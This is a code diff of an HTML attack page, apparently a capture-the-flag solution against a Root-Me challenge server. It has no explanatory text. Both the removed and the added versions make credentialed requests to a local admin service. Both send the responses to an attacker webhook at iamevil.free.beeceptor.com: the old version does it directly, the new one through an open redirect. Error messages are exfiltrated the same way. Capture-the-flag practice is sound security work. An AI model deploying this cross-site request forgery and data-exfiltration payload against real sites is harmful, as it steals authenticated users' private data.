@@ -1,28 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Attack</title>
+    <title>XSRF Attack</title>
 </head>
 <body>
     <script>
-        // Try all possible rule IDs including potential hidden ones
-        for (var i = 0; i <= 10; i++) {
-            fetch('http://127.0.0.1:58039/api/rules/' + i, {
-                credentials: 'include'
-            })
-            .then(response => response.text())
-            .then(data => {
-                // Send each rule's content to our server
-                fetch('https://iamevil.free.beeceptor.com/rule?id=' + i + '&content=' + encodeURIComponent(data))
-                .catch(() => {}); // Ignore fetch errors to webhook
-            })
-            .catch(() => {}); // Ignore rule fetch errors
-        }
-        
-        // Ensure redirect happens regardless
-        setTimeout(function() {
-            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/tried_all_rules';
-        }, 2000);
+        // Make a request to a page that might display the flag for admins
+        fetch('http://127.0.0.1:58039/home', {
+            credentials: 'include'
+        })
+        .then(response => response.text())
+        .then(html => {
+            // Extract any useful information from the HTML
+            // Then redirect with that data
+            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/home_content?data=' + encodeURIComponent(html);
+        })
+        .catch(error => {
+            // If there's an error, redirect anyway with the error message
+            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/error?message=' + encodeURIComponent(error.toString());
+        });
     </script>
 </body>
 </html>
